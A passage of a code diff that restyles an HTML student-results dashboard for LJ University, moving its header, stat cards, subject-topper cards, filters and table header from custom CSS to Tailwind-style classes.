-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 10px 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 10px;
-            transition: all 0.2s var(--ease);
-        }
-        .topper-mini-card:hover {
-            transform: translateY(-2px);
-            background: rgba(255, 255, 255, 0.06);
-            border-color: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-        .topper-badge {
-            font-size: 0.75rem;
-            font-weight: 700;
-            padding: 4px 6px;
-            border-radius: 6px;
-            text-align: center;
-            min-width: 65px;
-        }
-        .topper-info {
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-            min-width: 0;
-        }
-        .topper-name {
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: var(--text-main);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .topper-meta {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-        }
-        .topper-score {
-            font-size: 1rem;
-            font-weight: 700;
-            color: var(--success);
+            font-size: 0.78rem;
+            display: inline-block;
         }
 
-        /* Division Comparison Matrix styles */
-        .comparison-matrix-bar {
-            padding: 15px 20px;
-            display: flex;
-            flex-direction: column;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: var(--bg-glass);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-        }
-        .matrix-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.82rem;
-            color: var(--text-muted);
-            margin-top: 10px;
-        }
-        .matrix-table th, .matrix-table td {
-            padding: 8px 12px;
-            text-align: center;
-            border-bottom: 1px solid var(--border-glass);
-        }
-        .matrix-table th {
-            font-weight: 600;
-            color: var(--text-main);
-            background: rgba(255, 255, 255, 0.02);
-        }
-        .matrix-table tr:hover td {
-            background: rgba(255, 255, 255, 0.02);
-            color: var(--text-main);
-        }
-
-        /* Equal grid container for split matrix views */
-        .dashboard-equal-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 25px;
-        }
-        @media (max-width: 1024px) {
-            .dashboard-equal-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* Search match text highlight */
-        .search-match {
-            background: rgba(251, 191, 36, 0.3);
-            color: #ffd700;
+        /* Search Match */
+        mark.search-match {
+            background: rgba(251, 191, 36, 0.35);
+            color: inherit;
             padding: 0 2px;
             border-radius: 2px;
         }
 
-        /* Backlog tag in table */
-        .backlog-tag {
-            background: rgba(232, 67, 147, 0.15);
-            color: #e84393;
-            border: 1px solid rgba(232, 67, 147, 0.3);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            margin-left: 6px;
-            display: inline-block;
+        /* Modal Overlay */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(8px);
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
         }
 
-        /* Modal alert banner */
-        .alert-banner {
-            background: rgba(232, 67, 147, 0.12);
-            border: 1px solid rgba(232, 67, 147, 0.3);
-            color: #e84393;
-            padding: 10px 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            font-weight: 600;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .modal-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
         }
 
-        /* Grid secondary split */
-        .dashboard-secondary-grid {
-            display: grid;
-            grid-template-columns: 3.2fr 1.8fr;
-            gap: 20px;
-            margin-bottom: 25px;
+        .modal-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            transform: scale(0.95);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
-        @media (max-width: 1024px) {
-            .dashboard-secondary-grid {
-                grid-template-columns: 1fr;
+
+        .modal-overlay.show .modal-card {
+            transform: scale(1);
+        }
+
+        /* ═══ MOBILE-FIRST RESPONSIVE ═══ */
+
+        .tab-scroll-container {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .tab-scroll-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        @media (max-width: 639px) {
+            .mobile-controls-wrapper {
+                flex-direction: column !important;
+                align-items: stretch !important;
+                gap: 10px !important;
+                padding: 12px !important;
+            }
+
+            .header-actions {
+                width: 100%;
+                justify-content: flex-end;
+            }
+
+            .dashboard-grid {
+                grid-template-columns: 1fr !important;
+            }
+
+            .chart-section {
+                min-height: 220px;
+            }
+
+            .chart-area {
+                height: 170px;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr) !important;
+                gap: 8px;
+            }
+
+            .stat-card {
+                min-height: 80px !important;
+                padding: 10px !important;
+            }
+
+            .stat-card .stat-value {
+                font-size: 1.15rem !important;
+            }
+
+            .stat-card .stat-label {
+                font-size: 0.55rem !important;
+            }
+
+            .stat-card .stat-info {
+                font-size: 0.5rem !important;
+            }
+
+            .stat-card .stat-bg-icon {
+                font-size: 1.8rem !important;
+            }
+
+            .filters-section {
+                flex-direction: column !important;
+                width: 100% !important;
+                gap: 8px !important;
+            }
+
+            .filters-section>* {
+                width: 100% !important;
+                min-width: 0 !important;
+            }
+
+            .search-box {
+                width: 100% !important;
+            }
+
+            .search-box input {
+                width: 100% !important;
+            }
+
+            .filter-select {
+                width: 100% !important;
+            }
+
+            .filter-row {
+                flex-direction: row !important;
+                gap: 8px !important;
+            }
+
+            .filter-row>select {
+                flex: 1 !important;
+            }
+
+            .tab-btn {
+                padding: 5px 10px !important;
+                font-size: 0.65rem !important;
+                white-space: nowrap;
+            }
+
+            .student-badge {
+                font-size: 0.6rem !important;
+                padding: 3px 8px !important;
+            }
+
+            .tbl {
+                font-size: 0.7rem;
+            }
+
+            .tbl td,
+            .tbl th {
+                padding: 6px 8px !important;
+            }
+
+            .export-btn {
+                padding: 6px 12px !important;
+                font-size: 0.7rem !important;
             }
         }
-        .div-standings-bar {
-            padding: 15px 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: var(--bg-glass);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
+
+        @media (min-width: 640px) and (max-width: 1023px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr !important;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(4, 1fr) !important;
+            }
+
+            .filters-section {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+
+            .search-box {
+                flex: 1 1 200px;
+            }
+
+            .filter-select {
+                flex: 1 1 120px;
+            }
         }
-        .standings-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .standing-row {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 8px;
-            padding: 8px 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-size: 0.85rem;
-            transition: all 0.2s var(--ease);
-        }
-        .standing-row:hover {
-            background: rgba(255, 255, 255, 0.05);
-            border-color: rgba(255, 255, 255, 0.08);
-        }
-        .standing-rank {
-            font-weight: 700;
-            color: var(--text-muted);
-            min-width: 20px;
-        }
-        .standing-name {
-            font-weight: 600;
-            color: var(--text-main);
-            flex-grow: 1;
-            margin-left: 8px;
-        }
-        .standing-avg {
-            font-weight: 700;
-            color: var(--accent);
+
+        @media (min-width: 1024px) {
+            .dashboard-grid {
+                grid-template-columns: 5fr 3fr;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
     </style>
 </head>
 
-<body>
-    <div class="container">
+<body class="min-h-screen overflow-x-hidden">
+    <div class="max-w-[1520px] mx-auto px-3 sm:px-5 py-4 sm:py-5 pb-16">
 
         <!-- HEADER -->
-        <header>
-            <div class="brand">
-                <h1>LJ University</h1>
-                <p id="headerSubtitle">Advanced Academic Performance Dashboard • SY4 Sem-IV</p>
-            </div>
-            <div class="actions">
-                <!-- Theme Toggle -->
-                <div class="theme-switch" onclick="toggleTheme()" title="Toggle Theme">
-                    <i class="ri-moon-line icon moon"></i>
-                    <i class="ri-sun-line icon sun"></i>
-                    <div class="ball"></div>
+        <header class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 pb-5 sm:pb-6">
+            <div class="flex items-center gap-3">
+                <div
+                    class="w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-gradient-to-br from-[#7c6aef] to-[#22d3ee] flex items-center justify-center shadow-[0_4px_16px_rgba(124,106,239,0.3)] shrink-0">
+                    <i class="ri-graduation-cap-fill text-white text-lg sm:text-xl"></i>
                 </div>
-
-                <button class="btn" onclick="exportCSV()"><i class="ri-download-line"></i> Export CSV</button>
+                <div>
+                    <h1 class="text-xl sm:text-3xl font-extrabold tracking-tight gradient-title">
+                        LJ University
+                    </h1>
+                    <p id="headerSubtitle"
+                        class="text-[0.65rem] sm:text-sm text-[var(--text-secondary)] font-light tracking-wide mt-0.5 flex items-center gap-1.5">
+                        <span class="inline-block w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                        Advanced Academic Performance Dashboard &bull; SY4 Sem-IV
+                    </p>
+                </div>
+            </div>
+            <div class="flex items-center gap-2 header-actions">
+                <span
+                    class="version-badge hidden sm:inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[0.6rem] font-bold uppercase tracking-wider text-[#7c6aef]">
+                    <i class="ri-flashlight-fill text-xs"></i> GradeX v4.0
+                </span>
+                <div class="relative w-[68px] h-[34px] rounded-full bg-[var(--bg-surface-2)] border border-[var(--border)] cursor-pointer flex items-center justify-between px-2 shrink-0"
+                    onclick="toggleTheme()" title="Toggle Theme">
+                    <i class="ri-moon-line text-sm text-[var(--text-tertiary)] icon-moon z-[1]"></i>
+                    <i class="ri-sun-line text-sm text-[var(--text-tertiary)] icon-sun z-[1]"></i>
+                    <div
+                        class="theme-ball absolute top-[3px] left-[3px] w-[26px] h-[26px] bg-[#7c6aef] rounded-full shadow-[0_2px_8px_rgba(124,106,239,0.25)]">
+                    </div>
+                </div>
+                <button onclick="exportCSV()"
+                    class="fi export-btn inline-flex items-center gap-1.5 px-3 sm:px-4 py-2 rounded-full text-xs font-semibold hover:border-[#7c6aef] hover:shadow-[0_4px_12px_rgba(124,106,239,0.15)] hover:-translate-y-0.5 transition-all cursor-pointer shrink-0">
+                    <i class="ri-download-2-line"></i> Export
+                </button>
             </div>
         </header>
 
         <!-- DASHBOARD -->
-        <div class="dashboard-grid">
-            <div class="glass-panel analytics-card">
-                <div class="analytics-header">
-                    <div style="display:flex;align-items:center;gap:10px">
-                        <i class="ri-bar-chart-grouped-line" style="color: var(--accent);"></i>
-                        Subject Performance Analysis
-                    </div>
+        <div class="grid dashboard-grid gap-3 sm:gap-4 mb-3 sm:mb-4">
+            <div class="card rounded-xl p-3 sm:p-5 chart-section" style="min-height:240px">
+                <div
+                    class="flex items-center justify-between text-sm font-semibold text-[var(--text-secondary)] mb-3 sm:mb-4">
+                    <span class="flex items-center gap-2">
+                        <i class="ri-bar-chart-grouped-line text-cyan-400"></i> Sem-IV Subject Average Performance
+                    </span>
+                    <span class="text-xs font-normal text-[var(--text-tertiary)]">Max: 100 Marks</span>
                 </div>
-                <div style="position: relative; height: 260px; width: 100%;">
-                    <canvas id="gradeChart"></canvas>
-                </div>
+                <div class="relative h-[180px] sm:h-[200px] chart-area w-full"><canvas id="gradeChart"></canvas></div>
             </div>
 
-            <div class="stats-grid">
-                <div class="glass-panel stat-card" style="border-bottom: 4px solid var(--primary);">
-                    <i class="ri-user-star-line stat-icon"></i>
-                    <span class="stat-label">Top Performer</span>
-                    <span class="stat-value" id="stat-topper">--</span>
-                    <small style="color: var(--primary);">Highest Total</small>
+            <div class="grid stats-grid gap-2 sm:gap-3">
+                <div class="card rounded-xl p-3 sm:p-4 flex flex-col justify-between relative overflow-hidden border-b-[3px] border-b-[#7c6aef] stat-card hover:-translate-y-0.5 transition-transform"
+                    style="min-height:90px">
+                    <i
+                        class="ri-user-star-line absolute right-3 bottom-3 text-3xl sm:text-4xl opacity-[0.06] stat-bg-icon"></i>
+                    <span
+                        class="text-[0.6rem] sm:text-[0.65rem] font-bold uppercase tracking-wider text-[var(--text-tertiary)] stat-label">Top
+                        Performer</span>
+                    <span class="text-xl sm:text-2xl font-extrabold tracking-tight stat-value"
+                        id="stat-topper">--</span>
+                    <span class="text-[0.55rem] sm:text-[0.6rem] font-medium text-[#7c6aef] stat-info">Highest Total
+                        (/500)</span>
                 </div>
-                <div class="glass-panel stat-card" style="border-bottom: 4px solid var(--success);">
-                    <i class="ri-group-line stat-icon"></i>
-                    <span class="stat-label">Total Students</span>
-                    <span class="stat-value" id="stat-count">--</span>
-                    <small style="color: var(--success);">Active Records</small>
+
+                <div class="card rounded-xl p-3 sm:p-4 flex flex-col justify-between relative overflow-hidden border-b-[3px] border-b-emerald-400 stat-card hover:-translate-y-0.5 transition-transform"
+                    style="min-height:90px">
+                    <i
+                        class="ri-group-line absolute right-3 bottom-3 text-3xl sm:text-4xl opacity-[0.06] stat-bg-icon"></i>
+                    <span
+                        class="text-[0.6rem] sm:text-[0.65rem] font-bold uppercase tracking-wider text-[var(--text-tertiary)] stat-label">Total
+                        Students</span>
+                    <span class="text-xl sm:text-2xl font-extrabold tracking-tight stat-value" id="stat-count">--</span>
+                    <span class="text-[0.55rem] sm:text-[0.6rem] font-medium text-emerald-400 stat-info">Active
+                        Records</span>
                 </div>
-                <div class="glass-panel stat-card" style="border-bottom: 4px solid var(--secondary);">
-                    <i class="ri-functions-line stat-icon"></i>
-                    <span class="stat-label">Average Score</span>
-                    <span class="stat-value" id="stat-avg">--</span>
+
+                <div class="card rounded-xl p-3 sm:p-4 flex flex-col justify-between relative overflow-hidden border-b-[3px] border-b-pink-500 stat-card hover:-translate-y-0.5 transition-transform"
+                    style="min-height:90px">
+                    <i
+                        class="ri-functions absolute right-3 bottom-3 text-3xl sm:text-4xl opacity-[0.06] stat-bg-icon"></i>
+                    <span
+                        class="text-[0.6rem] sm:text-[0.65rem] font-bold uppercase tracking-wider text-[var(--text-tertiary)] stat-label">Class
+                        Average</span>
+                    <span class="text-xl sm:text-2xl font-extrabold tracking-tight stat-value" id="stat-avg">--</span>
+                    <span class="text-[0.55rem] sm:text-[0.6rem] font-medium text-pink-500 stat-info">Across All
+                        Subjects</span>
                 </div>
-                <div class="glass-panel stat-card" style="border-bottom: 4px solid var(--warning);">
-                    <i class="ri-trophy-line stat-icon"></i>
-                    <span class="stat-label">Pass Rate</span>
-                    <span class="stat-value">100%</span>
+
+                <div class="card rounded-xl p-3 sm:p-4 flex flex-col justify-between relative overflow-hidden border-b-[3px] border-b-amber-400 stat-card hover:-translate-y-0.5 transition-transform"
+                    style="min-height:90px">
+                    <i
+                        class="ri-trophy-line absolute right-3 bottom-3 text-3xl sm:text-4xl opacity-[0.06] stat-bg-icon"></i>
+                    <span
+                        class="text-[0.6rem] sm:text-[0.65rem] font-bold uppercase tracking-wider text-[var(--text-tertiary)] stat-label">Pass
+                        Rate</span>
+                    <span class="text-xl sm:text-2xl font-extrabold tracking-tight stat-value" id="stat-pass">--</span>
+                    <span class="text-[0.55rem] sm:text-[0.6rem] font-medium text-amber-400 stat-info"
+                        id="stat-pass-info">Min 33 per subject</span>
                 </div>
             </div>
         </div>
 
-        <!-- TOPPERS & DIVISION STANDINGS LEADERBOARD -->
-        <div class="dashboard-secondary-grid">
-            <!-- Left: Subject Toppers -->
-            <div class="glass-panel toppers-bar">
-                <div class="toppers-title">
-                    <i class="ri-trophy-line" style="color: var(--accent); font-size: 1.2rem;"></i>
-                    <span>Subject Wise Toppers</span>
+        <!-- SUBJECT TOPPERS & DIVISION STANDINGS -->
+        <div class="flex items-center justify-between mb-3 mt-6 sm:mt-8">
+            <div class="flex items-center gap-3">
+                <div class="w-8 h-8 sm:w-10 sm:h-10 rounded-lg bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center shadow-[0_4px_12px_rgba(251,191,36,0.3)] relative overflow-hidden group">
+                    <div class="absolute inset-0 bg-white/20 transform -skew-x-12 -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
+                    <i class="ri-vip-crown-fill text-white text-sm sm:text-base drop-shadow-md"></i>
                 </div>
-                <div class="toppers-grid">
-                    <!-- Card 1: DM -->
-                    <div class="topper-mini-card">
-                        <div class="topper-badge" style="background:rgba(108,92,231,0.12); color:#6c5ce7; border: 1px solid rgba(108,92,231,0.2)">DM</div>
-                        <div class="topper-info">
-                            <span class="topper-name" id="topper-dm-name">Loading...</span>
-                            <span class="topper-meta" id="topper-dm-meta">Roll -- • Div --</span>
-                        </div>
-                        <span class="topper-score" id="topper-dm-score">--</span>
-                    </div>
-                    <!-- Card 2: COA -->
-                    <div class="topper-mini-card">
-                        <div class="topper-badge" style="background:rgba(0,206,201,0.12); color:#00cec9; border: 1px solid rgba(0,206,201,0.2)">COA</div>
-                        <div class="topper-info">
-                            <span class="topper-name" id="topper-coa-name">Loading...</span>
-                            <span class="topper-meta" id="topper-coa-meta">Roll -- • Div --</span>
-                        </div>
-                        <span class="topper-score" id="topper-coa-score">--</span>
-                    </div>
-                    <!-- Card 3: FSD -->
-                    <div class="topper-mini-card">
-                        <div class="topper-badge" style="background:rgba(232,67,147,0.12); color:#e84393; border: 1px solid rgba(232,67,147,0.2)">FSD-II</div>
-                        <div class="topper-info">
-                            <span class="topper-name" id="topper-fsd-name">Loading...</span>
-                            <span class="topper-meta" id="topper-fsd-meta">Roll -- • Div --</span>
-                        </div>
-                        <span class="topper-score" id="topper-fsd-score">--</span>
-                    </div>
-                    <!-- Card 4: PYTHON -->
-                    <div class="topper-mini-card">
-                        <div class="topper-badge" style="background:rgba(253,203,110,0.12); color:#fdcb6e; border: 1px solid rgba(253,203,110,0.2)">Python-II</div>
-                        <div class="topper-info">
-                            <span class="topper-name" id="topper-python-name">Loading...</span>
-                            <span class="topper-meta" id="topper-python-meta">Roll -- • Div --</span>
-                        </div>
-                        <span class="topper-score" id="topper-python-score">--</span>
-                    </div>
-                    <!-- Card 5: TOC -->
-                    <div class="topper-mini-card">
-                        <div class="topper-badge" style="background:rgba(46,213,115,0.12); color:#2ed573; border: 1px solid rgba(46,213,115,0.2)">TOC</div>
-                        <div class="topper-info">
-                            <span class="topper-name" id="topper-toc-name">Loading...</span>
-                            <span class="topper-meta" id="topper-toc-meta">Roll -- • Div --</span>
-                        </div>
-                        <span class="topper-score" id="topper-toc-score">--</span>
-                    </div>
+                <div>
+                    <h2 class="text-sm sm:text-lg font-extrabold text-[var(--text)] tracking-tight">Academic Excellence Board</h2>
+                    <p class="text-[0.65rem] sm:text-xs text-[var(--text-tertiary)] font-medium mt-0.5">Top Performers & Division Standings</p>
                 </div>
             </div>
-            
-            <!-- Right: Division Standings -->
-            <div class="glass-panel div-standings-bar">
-                <div class="toppers-title">
-                    <i class="ri-bar-chart-line" style="color: var(--primary); font-size: 1.2rem;"></i>
-                    <span>Division Rankings</span>
+            <div class="h-[1px] flex-1 bg-gradient-to-r from-[var(--border)] to-transparent mx-4 hidden md:block opacity-70"></div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-6 gap-3 sm:gap-4 mb-4 sm:mb-5 relative">
+            <div class="absolute -inset-4 bg-gradient-to-b from-amber-500/5 to-transparent rounded-2xl -z-10 blur-xl pointer-events-none opacity-50"></div>
+            <div class="pro-topper-card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1" style="--subj-color: #7c6aef;">
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] flex items-center justify-between">
+                    <span class="tracking-widest">Discrete Math</span> <i class="ri-medal-fill pro-crown"></i>
                 </div>
-                <div class="standings-list" id="divStandingsList">
-                    <!-- Dynamically populated -->
+                <div id="topper-dm-name" class="pro-name text-xs truncate mt-1.5" title="Loading...">--</div>
+                <div class="flex justify-between items-end text-[0.65rem] mt-2">
+                    <span id="topper-dm-meta" class="text-[var(--text-tertiary)] font-medium">--</span>
+                    <span id="topper-dm-score" class="font-black text-[0.95rem]" style="color: var(--subj-color);">--</span>
+                </div>
+            </div>
+
+            <div class="pro-topper-card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1" style="--subj-color: #22d3ee;">
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] flex items-center justify-between">
+                    <span class="tracking-widest">COA</span> <i class="ri-medal-fill pro-crown"></i>
+                </div>
+                <div id="topper-coa-name" class="pro-name text-xs truncate mt-1.5" title="Loading...">--</div>
+                <div class="flex justify-between items-end text-[0.65rem] mt-2">
+                    <span id="topper-coa-meta" class="text-[var(--text-tertiary)] font-medium">--</span>
+                    <span id="topper-coa-score" class="font-black text-[0.95rem]" style="color: var(--subj-color);">--</span>
+                </div>
+            </div>
+
+            <div class="pro-topper-card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1" style="--subj-color: #ec4899;">
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] flex items-center justify-between">
+                    <span class="tracking-widest">FSD-II</span> <i class="ri-medal-fill pro-crown"></i>
+                </div>
+                <div id="topper-fsd-name" class="pro-name text-xs truncate mt-1.5" title="Loading...">--</div>
+                <div class="flex justify-between items-end text-[0.65rem] mt-2">
+                    <span id="topper-fsd-meta" class="text-[var(--text-tertiary)] font-medium">--</span>
+                    <span id="topper-fsd-score" class="font-black text-[0.95rem]" style="color: var(--subj-color);">--</span>
+                </div>
+            </div>
+
+            <div class="pro-topper-card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1" style="--subj-color: #fbbf24;">
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] flex items-center justify-between">
+                    <span class="tracking-widest">Python-II</span> <i class="ri-medal-fill pro-crown"></i>
+                </div>
+                <div id="topper-python-name" class="pro-name text-xs truncate mt-1.5" title="Loading...">--</div>
+                <div class="flex justify-between items-end text-[0.65rem] mt-2">
+                    <span id="topper-python-meta" class="text-[var(--text-tertiary)] font-medium">--</span>
+                    <span id="topper-python-score" class="font-black text-[0.95rem]" style="color: var(--subj-color);">--</span>
+                </div>
+            </div>
+
+            <div class="pro-topper-card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1" style="--subj-color: #34d399;">
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] flex items-center justify-between">
+                    <span class="tracking-widest">TOC</span> <i class="ri-medal-fill pro-crown"></i>
+                </div>
+                <div id="topper-toc-name" class="pro-name text-xs truncate mt-1.5" title="Loading...">--</div>
+                <div class="flex justify-between items-end text-[0.65rem] mt-2">
+                    <span id="topper-toc-meta" class="text-[var(--text-tertiary)] font-medium">--</span>
+                    <span id="topper-toc-score" class="font-black text-[0.95rem]" style="color: var(--subj-color);">--</span>
+                </div>
+            </div>
+
+            <div class="card rounded-xl p-3.5 flex flex-col justify-between lg:col-span-1 bg-[var(--bg-surface-2)] shadow-[inset_0_1px_0_rgba(255,255,255,0.05)] border-[var(--border)] relative overflow-hidden group">
+                <div class="absolute -right-6 -top-6 text-6xl opacity-[0.03] group-hover:opacity-[0.06] transition-opacity duration-500 text-amber-400">
+                    <i class="ri-medal-fill"></i>
+                </div>
+                <div class="text-[0.65rem] font-bold uppercase text-[var(--text-tertiary)] mb-2 flex items-center gap-1.5 tracking-wider z-10">
+                    <i class="ri-medal-line text-amber-400 text-sm"></i> Div Standings
+                </div>
+                <div id="divStandingsList" class="space-y-1.5 text-xs z-10">
+                    <!-- Dynamic Top Divisions -->
                 </div>
             </div>
         </div>
 
-        <!-- MATRIXES GRID -->
-        <div class="dashboard-equal-grid">
-            <!-- Left: Class Comparison Matrix -->
-            <div class="glass-panel comparison-matrix-bar">
-                <div class="toppers-title" style="margin-bottom: 12px;">
-                    <i class="ri-grid-line" style="color: var(--accent); font-size: 1.2rem;"></i>
-                    <span>Division Wise Subject Averages Comparison Matrix</span>
+        <!-- CONTROLS -->
+        <div
+            class="card rounded-xl px-3 sm:px-4 py-3 mb-3 sm:mb-4 flex flex-col lg:flex-row justify-between items-start lg:items-center gap-3 mobile-controls-wrapper">
+            <div class="flex flex-wrap items-center gap-2 sm:gap-2.5 w-full lg:w-auto">
+                <!-- View Tabs -->
+                <div class="tab-scroll-container">
+                    <div
+                        class="relative inline-flex bg-[var(--bg-surface-2)] border border-[var(--border)] rounded-full p-[3px]">
+                        <div class="tab-pill" id="tabIndicator"></div>
+                        <button
+                            class="tab-btn view-tab active relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-3 sm:px-4 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setMode('new',this)" style="font-family:inherit">Rank View</button>
+                        <button
+                            class="tab-btn view-tab relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-3 sm:px-4 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setMode('original',this)" style="font-family:inherit">Classic View</button>
+                    </div>
                 </div>
-                <div style="overflow-x: auto;">
-                    <table class="matrix-table">
+                <!-- Dept Tabs -->
+                <div class="tab-scroll-container">
+                    <div
+                        class="relative inline-flex bg-[var(--bg-surface-2)] border border-[var(--border)] rounded-full p-[3px]">
+                        <div class="tab-pill" id="deptTabIndicator"></div>
+                        <button
+                            class="tab-btn dept-tab active relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-2.5 sm:px-3 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setDept('Overall',this)" style="font-family:inherit">Overall</button>
+                        <button
+                            class="tab-btn dept-tab relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-2.5 sm:px-3 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setDept('SY1',this)" style="font-family:inherit">SY1</button>
+                        <button
+                            class="tab-btn dept-tab relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-2.5 sm:px-3 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setDept('SY2',this)" style="font-family:inherit">SY2</button>
+                        <button
+                            class="tab-btn dept-tab relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-2.5 sm:px-3 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setDept('SY3',this)" style="font-family:inherit">SY3</button>
+                        <button
+                            class="tab-btn dept-tab relative z-[2] bg-transparent border-none text-[var(--text-secondary)] px-2.5 sm:px-3 py-1.5 rounded-full cursor-pointer font-semibold text-xs transition-colors"
+                            onclick="setDept('SY4',this)" style="font-family:inherit">SY4</button>
+                    </div>
+                </div>
+                <span
+                    class="student-badge inline-flex items-center gap-1 px-2.5 sm:px-3 py-1 rounded-full text-[0.65rem] sm:text-[0.7rem] font-semibold bg-[rgba(124,106,239,0.1)] text-[#7c6aef] border border-[rgba(124,106,239,0.15)]">
+                    <i class="ri-user-line text-xs"></i> <span id="badgeCount">0</span> students
+                </span>
+            </div>
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 w-full lg:w-auto filters-section">
+                <div class="relative w-full sm:w-auto sm:flex-1 lg:flex-none lg:w-[240px] search-box">
+                    <i
+                        class="ri-search-line absolute left-3 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)] text-sm"></i>
+                    <input type="text" id="searchInput" placeholder="Search name, roll, enrollment..."
+                        class="fi w-full py-2.5 sm:py-2 pl-9 pr-3 rounded-lg text-xs font-medium outline-none"
+                        style="font-family:inherit">
+                </div>
+                <div class="flex gap-2 w-full sm:w-auto filter-row">
+                    <select id="branchFilter"
+                        class="fi filter-select py-2.5 sm:py-2 px-3 rounded-lg text-xs font-medium outline-none cursor-pointer flex-1 sm:flex-none sm:w-[130px]"
+                        style="font-family:inherit">
+                        <option value="">All Branches</option>
+                    </select>
+                    <select id="divFilter"
+                        class="fi filter-select py-2.5 sm:py-2 px-3 rounded-lg text-xs font-medium outline-none cursor-pointer flex-1 sm:flex-none sm:w-[130px]"
+                        style="font-family:inherit">
+                        <option value="">All Divisions</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- TABLE -->
+        <div class="card rounded-xl overflow-hidden mb-4">
+            <div class="overflow-auto max-h-[72vh]" id="tableScroll">
+                <table class="tbl w-full">
+                    <thead>
+                        <tr>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)] whitespace-nowrap"
+                                onclick="sortTable('rank')">Rank <i
+                                    class="ri-arrow-up-down-line text-[0.6rem] opacity-50"></i></th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)] whitespace-nowrap"
+                                onclick="sortTable('roll')">Roll No <i
+                                    class="ri-arrow-up-down-line text-[0.6rem] opacity-50"></i></th>
+                            <th
+                                class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]">
+                                DEPT</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('div')">Div <i
+                                    class="ri-arrow-up-down-line text-[0.6rem] opacity-50"></i></th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('branch')">Branch <i
+                                    class="ri-arrow-up-down-line text-[0.6rem] opacity-50"></i></th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
